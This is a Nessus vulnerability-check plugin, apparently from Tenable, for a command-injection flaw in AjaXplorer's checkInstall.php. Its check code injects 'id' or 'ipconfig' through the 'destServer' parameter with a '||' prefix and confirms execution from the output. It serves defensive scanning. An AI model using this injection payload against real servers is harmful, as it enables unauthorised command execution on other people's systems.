#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(45489);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2015/09/24 20:59:27 $");

  script_bugtraq_id(39334);
  script_osvdb_id(63552);

  script_name(english:"AjaXplorer checkInstall.php Arbitrary Command Injection");
  script_summary(english:"Tries to run id or ipconfig");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web application has an arbitrary command injection
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of AjaXplorer running on the remote web server has a
command injection vulnerability.  Input passed to the 'destServer'
parameter of 'checkInstall.php' is used in a call to popen() without
being properly sanitized.

A remote, unauthenticated attacker could exploit this to execute
arbitrary commands on the system subject to the privileges of the web
server user.

This version of AjaXplorer likely has other vulnerabilities, though
Nessus has not checked for those issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e68820e7");
  script_set_attribute(attribute:"solution", value:"Upgrade to AjaXplorer version 2.6 / 2.7.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"AjaXplorer 2.5.5 RCE (Windows)");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"metasploit_name", value:'AjaXplorer checkInstall.php Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/04/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("ajaxplorer_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/ajaxplorer");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'ajaxplorer', port:port, exit_on_fail:TRUE);

os = get_kb_item("Host/OS");

if (!os || 'Windows' >< os)
  cmds['ipconfig'] = 'Windows IP Configuration';
if (!os || 'Windows' >!< os)
  cmds['id'] = 'uid=[0-9]+.*gid=[0-9]+.*';

foreach cmd (keys(cmds))
{
  http_check_remote_code(
    port:port,
    unique_dir:install['dir'],
    check_request:'/plugins/access.ssh/checkInstall.php?destServer=||'+cmd,
    check_result:cmds[cmd],
    extra_check:"<h1>Testing ssh access from webserver's user</h1>",
    command:cmd
  );
}

base_url = build_url(qs:install['dir']+'/', port:port);
exit(0, 'The AjaXplorer install at '+base_url+' is not affected.');
